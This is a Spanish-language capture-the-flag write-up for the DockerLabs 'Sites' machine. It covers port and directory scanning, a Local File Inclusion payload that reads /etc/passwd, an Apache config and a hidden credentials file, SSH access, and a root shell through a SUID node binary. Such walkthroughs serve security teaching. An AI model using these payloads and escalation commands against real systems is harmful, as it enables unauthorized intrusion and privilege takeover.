## Introducción

Este documento presenta la resolución completa de la máquina **Sites**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
El laboratorio expone un servidor web con un archivo `vulnerable.php` que incluye archivos locales sin validación, permitiendo **Local File Inclusion (LFI)**. Mediante esta vulnerabilidad, se lee el archivo de configuración de Apache y se descubre un recurso oculto que contiene credenciales SSH del usuario `chocolate`.
Una vez dentro, se identifica que el binario `node` tiene permisos SUID. Al ejecutar Node.js con privilegios elevados, se obtiene una shell como `root`, completando la escalada de privilegios.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Sites.zip
sudo bash auto_deploy.sh Sites.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Sites/{content,exploits,nmap,scripts}
cd Sites
```

---

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1769565444/Ports_azinpb.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p22,80 172.17.0.2
```

---

### 1.3 Enumeración web

Se realiza un escaneo de directorios:

```bash
feroxbuster -u http://172.17.0.2/ \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
  -x php,html,txt,js -t 100 -C 404
```

![Feroxbuster](https://res.cloudinary.com/dewqswzke/image/upload/v1769565442/Feroxbuster_apm70o.png)

**Archivos relevantes:**

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Local File Inclusion

El archivo `vulnerable.php` permite LFI:

```
http://172.17.0.2/vulnerable.php?page=/etc/passwd
```

![Passwd](https://res.cloudinary.com/dewqswzke/image/upload/v1769565443/Passwd_ckdumk.png)

### 2.2 Lectura de archivos de configuración

Se lee el archivo de configuración de Apache:

```
http://172.17.0.2/vulnerable.php?page=/etc/apache2/sites-available/sitio.conf
```

![Sitio.conf](https://res.cloudinary.com/dewqswzke/image/upload/v1769565445/Sitio.config_kpxlw7.png)

Se descubre el recurso oculto `archivitotraviesito`:

```
http://172.17.0.2/vulnerable.php?page=/var/www/html/archivitotraviesito
```

![Archivo](https://res.cloudinary.com/dewqswzke/image/upload/v1769565442/Archivo_rjgeni.png)

### 2.3 Acceso SSH

```bash
ssh chocolate@172.17.0.2
```

![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1769565445/SSh_yu60do.png)

## Paso 3 — Escalada de privilegios

### 3.1 De chocolate → root

Se buscan binarios con permisos SUID:

```bash
find / -perm -4000 2>/dev/null
```

![Find](https://res.cloudinary.com/dewqswzke/image/upload/v1769565442/FInd_ffyjvk.png)

Se identifica que `node` tiene permisos SUID. Se ejecuta:

```bash
node -e 'require("child_process").spawn("/bin/bash", ["-p"], {stdio: [0, 1, 2]})'
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1769565444/Root_vftbct.png)
